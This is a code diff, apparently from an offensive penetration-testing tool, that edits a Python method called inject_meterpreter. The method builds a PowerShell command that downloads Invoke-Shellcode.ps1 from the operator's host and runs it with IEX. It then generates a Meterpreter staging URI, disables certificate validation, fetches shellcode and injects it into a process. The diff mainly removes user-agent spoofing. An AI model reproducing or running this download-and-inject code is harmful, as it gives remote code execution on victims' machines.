@@ -94,29 +94,21 @@ class PowerShell:
     def inject_meterpreter(self):
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
         #so now we have to manually generate a valid Meterpreter request URL and download + exec the staged shellcode
-        
-        command = """
-        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1');
 
-        $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent'
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('{}://{}:{}/Invoke-Shellcode.ps1')
         $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {{[Char]$_}}
         $SumTest = $False
-
-        while ($SumTest -eq $False) 
+        while ($SumTest -eq $False)
         {{
             $GeneratedUri = $CharArray | Get-Random -Count 4
             $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
         }}
-
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$True}}
         $RequestUri = -join $GeneratedUri
-        $Request = "{}://{}:{}/$($RequestUri)" 
- 
-        $Uri = New-Object Uri($Request)
+        $Request = "{}://{}:{}/$($RequestUri)"
         $WebClient = New-Object System.Net.WebClient
-        $WebClient.Headers.Add('user-agent', "$UserAgent")
-        [Byte[]] $bytes = $WebClient.DownloadData($Uri)
-
+        [Byte[]]$bytes = $WebClient.DownloadData($Request)
         Invoke-{} -Force -Shellcode $bytes""".format(self.protocol,
                                                      self.localip,
                                                      settings.args.server_port,
@@ -124,10 +116,9 @@ class PowerShell:
                                                      settings.args.met_options[0],
                                                      settings.args.met_options[1],
                                                      self.func_name)
+
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
-
-        command += ';'
 
         return ps_command(command)
 
